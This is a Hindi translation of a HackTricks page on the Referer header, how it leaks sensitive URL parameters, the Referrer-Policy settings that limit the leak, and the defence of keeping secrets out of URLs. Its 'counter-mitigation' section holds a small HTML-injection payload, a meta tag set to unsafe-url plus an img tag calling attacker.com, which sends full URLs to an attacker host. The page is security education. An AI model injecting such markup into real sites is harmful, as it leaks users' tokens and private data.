{% hint style="success" %}
सीखें और प्रैक्टिस करें AWS हैकिंग: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
सीखें और प्रैक्टिस करें GCP हैकिंग: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PRs सबमिट करके।

</details>
{% endhint %}


# रेफरर हेडर्स और नीति

रेफरर वह हेडर है जिसका उपयोग ब्राउज़र द्वारा किया जाता है ताकि पता चले कि पिछले दौरे का कौन सा पृष्ठ देखा गया था।

## संवेदनशील जानकारी लीक हो गई

यदि किसी वेब पृष्ठ के अंदर किसी GET अनुरोध पैरामीटर पर कोई संवेदनशील जानकारी होती है, यदि पृष्ठ में बाहरी स्रोतों के लिंक होते हैं या एक हमलावर उसे एक URL पर जाने के लिए मजबूर करता है/सुझाव देता है (सोशल इंजीनियरिंग), तो वह हमलावर संवेदनशील जानकारी को नवीनतम GET अनुरोध के अंदर निकाल सकता है।

## संशोधन

आप ब्राउज़र को एक **रेफरर-नीति** का पालन करने के लिए कर सकते हैं जो संवेदनशील जानकारी को अन्य वेब एप्लिकेशनों को भेजने से **बचा** सकता है:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## काउंटर-मिटिगेशन

आप इस नियम को एचटीएमएल मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एचटीएमएल इंजेक्शन का शोषण करना होगा):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## रक्षा

कभी भी URL में GET पैरामीटर या पथ में कोई भी संवेदनशील डेटा न डालें।

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
